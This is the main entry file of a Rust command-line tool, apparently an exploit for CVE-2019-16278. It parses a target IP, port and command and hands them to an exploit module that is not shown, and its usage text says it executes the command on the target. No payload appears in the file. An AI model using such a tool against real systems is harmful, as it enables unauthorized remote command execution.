extern crate failure;

pub mod exploit;

use std::env;
use failure::{Error};
use exploit::{cve_2019_16278};

fn print_usage() {

    println!("Usage: ./cve-2019-16278 <target-ip> <target-port> <command>\nExploits the CVE-2019-16278 vulnerability and executes the command on target");
}

fn main() -> Result<(), Error> {

    let args: Vec<String> = env::args().collect();

    if args.len() == 4 {

        let host_str = &args[1];
        let port_str = &args[2];
        let command_str = &args[3];

        match port_str.parse::<i32>() {

            Ok(port) => cve_2019_16278::run(&host_str, port, &command_str),
            Err(_) => {
                println!("Invalid port number specified");
                print_usage();
                Ok(())
            }
        }?

    } else {
        print_usage();
    }

    Ok(())
}
